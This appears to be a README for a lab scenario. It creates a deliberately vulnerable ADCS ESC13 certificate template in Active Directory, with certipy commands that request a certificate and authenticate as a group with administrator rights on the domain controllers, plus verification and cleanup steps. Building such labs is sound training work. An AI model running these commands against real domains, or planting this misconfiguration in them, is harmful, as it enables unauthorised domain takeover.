# esc13

Creates template `ESC13` (enrollable by `<NB>\Domain Users`) with issuance policy `IssuancePolicyESC13`, linked (`msDS-OIDToGroupLink`) to the universal group `scn-esc13-group`. The group is a member of `BUILTIN\Administrators` of the domain (a universal group cannot join `Domain Admins`), so a certificate from `ESC13` gives administrator rights on the domain controllers.

Attack:

    certipy req -u <user>@<domain> -p 'Aa1234567890!' -dc-ip <dc ip> -ca <NB>-CA -template ESC13
    certipy auth -pfx <user>.pfx -dc-ip <dc ip>   # the TGT carries scn-esc13-group

How to verify:

    certipy find -u <user>@<domain> -p 'Aa1234567890!' -dc-ip <dc ip> -vulnerable -stdout   # ESC13

Disable revokes the certificates issued from `ESC13`, deletes the template, the issuance policy object(s) and the group (with its membership).
